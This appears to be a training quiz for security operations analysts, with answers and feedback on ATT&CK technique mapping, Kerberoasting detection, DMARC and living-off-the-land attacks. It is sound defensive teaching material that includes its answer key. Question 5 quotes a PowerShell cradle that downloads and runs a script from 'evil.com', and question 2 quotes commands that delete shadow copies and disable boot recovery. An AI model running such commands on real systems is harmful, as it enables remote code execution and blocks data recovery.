name.text: Session 06 Final Quiz — Incident Analysis in a Threat-Centric SOC

intro.text: Complete this quiz after finishing all session content. 7 questions, 15 minutes. Passing score: 5/7.

questiontext.text: A SOC analyst discovers that svchost.exe running on a server is making outbound TCP connections to port 4444 on an external IP. The process has a parent process of powershell.exe. Which MITRE ATT&CK technique BEST describes the svchost.exe behavior?

feedback.text: Process injection involves inserting code into a running process. Here, svchost.exe is a separate process spawned by PowerShell, not injected code.

Correct. Legitimate svchost.exe is always spawned by services.exe or wininit.exe — never by PowerShell. A svchost.exe process with a PowerShell parent is a malicious process using a legitimate Windows name to blend in (masquerading). This is T1036.005.

answer.text: T1543.003 — Create or Modify System Process: Windows Service

feedback.text: This technique describes creating or modifying services for persistence. The key indicator here is the suspicious parent process, pointing to masquerading rather than service creation.

answer.text: T1071.001 — Application Layer Protocol: Web Protocols

feedback.text: T1071.001 describes using web protocols (HTTP/S) for C2. The network connection to port 4444 is suspicious, but the primary behavioral indicator here is the masquerading name and anomalous parent process.

questiontext.text: During an incident, you discover: vssadmin.exe delete shadows /all /quiet followed by bcdedit /set {default} bootstatuspolicy ignoreallfailures. What type of incident is MOST likely in progress?

feedback.text: These commands do not transfer data externally. They modify system recovery settings — specifically, they remove recovery options to prevent undoing an upcoming destructive operation.

Correct. Both commands are standard ransomware preparation. vssadmin removes Volume Shadow Copies (preventing file restoration). bcdedit disables Windows error recovery (preventing boot-time repair). These are T1490 (Inhibit System Recovery) — the attacker is preparing the system so victims cannot recover files without paying.
Pass-the-Hash involves reusing NTLM hashes for authentication to remote systems. These commands target local recovery mechanisms, not network authentication.
SQL injection affects web application databases. These are Windows system commands executed locally, completely unrelated to SQL injection.

name.text: Q3: Pyramid of Pain — least valuable indicator

questiontext.text: Using the Pyramid of Pain framework (David Bianco), which indicator type is the LEAST valuable for detection because it is easiest for attackers to change?

feedback.text: TTPs are at the TOP of the pyramid — the most valuable and hardest for attackers to change. Changing TTPs requires retraining, buying new tools, and fundamentally changing how the actor operates.
Artifacts (file paths, registry keys, mutexes) are in the middle of the pyramid — harder to change than hashes or IPs, but less valuable than TTPs.

Correct. File hashes are at the BOTTOM of the Pyramid of Pain — the easiest for attackers to change. Recompiling the same malware with one byte different produces a completely new hash. IOC-based detection using hashes is trivially bypassed. TTP-based detection survives tool changes.

Domain names are higher in the pyramid than hashes — changing them requires registering new domains, updating malware configurations, and waiting for DNS propagation. More costly to change than hashes, but still not as valuable as TTP-based detection.

questiontext.text: A threat intelligence report indicates an attacker group uses Kerberoasting (T1558.003). Which Windows Security Event would BEST detect this technique?

feedback.text: Event 4624 logs successful logons. Logon_Type 3 is network logon (SMB). This is relevant to lateral movement, not Kerberoasting.

answer.text: Event ID 4769 (Kerberos Service Ticket Request) with RC4 encryption type (0x17)

feedback.text: Correct. Kerberoasting requests TGS tickets using RC4 (0x17) encryption because RC4-encrypted tickets are crackable offline. Modern Kerberos defaults to AES (0x12/0x11). When you see Event 4769 with ticket_encryption_type=0x17 for a service account, this is a strong Kerberoasting signal (T1558.003).
Event 4688 for net.exe detects domain enumeration commands (net user /domain). Kerberoasting uses Kerberos protocol directly — no net.exe command is involved.
Event 4672 fires when a special privilege is assigned at logon (e.g., SeDebugPrivilege). This is relevant to privilege escalation monitoring but does not specifically detect Kerberoasting.

name.text: Q5: PowerShell download cradle ATT&CK techniques

questiontext.text:
You decode a Base64 PowerShell command: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')

Which two ATT&CK techniques BEST describe this activity?

feedback.text: Correct. IEX executing a remotely hosted PowerShell script is: T1059.001 (PowerShell as execution engine) + T1105 (downloading a tool/payload from external infrastructure = Ingress Tool Transfer). The Base64 encoding also adds T1027 (Obfuscation), but the primary pair describing the cradle behavior is PS + Ingress Tool Transfer.
T1566.001 describes the phishing delivery mechanism (email with attachment). The download cradle itself is execution + tool download, not the initial phishing delivery.
T1071.001 describes C2 over web protocols. T1105 is correct, but the execution engine used is PowerShell (T1059.001), which is the more specific and actionable technique here.
T1027 describes the Base64 encoding (obfuscation) and T1204.002 describes user execution of malicious files. These are related but don't specifically describe the download cradle behavior.

questiontext.text: An organization's DMARC policy is set to p=none. A threat actor sends a phishing email spoofing the CEO's domain. What is the security impact of the p=none policy?

answer.text: The email will be rejected at the mail gateway

feedback.text: Rejection requires p=reject. With p=none, no enforcement action is taken — the domain owner receives reports but emails pass through regardless of authentication failure.

answer.text: The email will be quarantined to spam/junk folder

feedback.text: Quarantine requires p=quarantine. With p=none, emails are not quarantined even when authentication fails.

answer.text: The email will be delivered with a DMARC PASS result

feedback.text: A spoofed email would fail SPF and/or DKIM, resulting in a DMARC FAIL — but with p=none, this failure has no enforcement consequence and the email is still delivered.

answer.text: The email will be delivered despite authentication failure — p=none only monitors, it does not enforce

feedback.text: Correct. DMARC p=none = monitoring mode. Authentication results are reported to the domain owner but no enforcement action is taken. Phishing emails that fail SPF/DKIM/DMARC checks are still delivered. Moving to p=quarantine or p=reject is necessary to prevent spoofed email delivery. Many organizations remain in p=none for extended periods, creating a persistent phishing vulnerability.

name.text: Q7: 21-day dwell time with LOLBins — lesson learned

questiontext.text: A post-incident review reveals the attacker had domain admin credentials for 21 days before ransomware deployment, using only living-off-the-land techniques (LOLBins) and valid credentials. No custom malware was used. What is the PRIMARY lesson learned?

answer.text: The firewall should have blocked the initial phishing email

feedback.text: Improving email filtering addresses the delivery phase, but does not solve the detection gap for the 21-day post-compromise period. The lesson is about detection during the post-compromise phase, not just initial access prevention.

answer.text: Detection based only on IOCs (file hashes, IPs) is insufficient — behavioral/TTP-based detection is required

feedback.text: Correct. LOLBins produce no malicious file hashes (they are Microsoft-signed binaries). Valid credentials produce no unauthorized account alerts. IOC-based detection is completely blind to this attack pattern. Only behavioral detection can identify living-off-the-land: DCSync from workstations, massive RC4 Kerberos ticket requests, unusual AD enumeration, scheduled task creation on DCs. This is the fundamental argument for threat-centric, TTP-based detection over compliance-driven, IOC-based detection.

answer.text: The organization should have enforced MFA on email

feedback.text: MFA on email addresses initial credential compromise but does not address the detection gap for the 21-day dwell period using LOLBins and valid credentials on internal systems.

answer.text: The incident response plan should have faster recovery procedures

feedback.text: Faster recovery addresses the post-detection phase. The 21-day dwell time means the attacker was not detected at all — improving recovery speed doesn't address the fundamental detection gap.
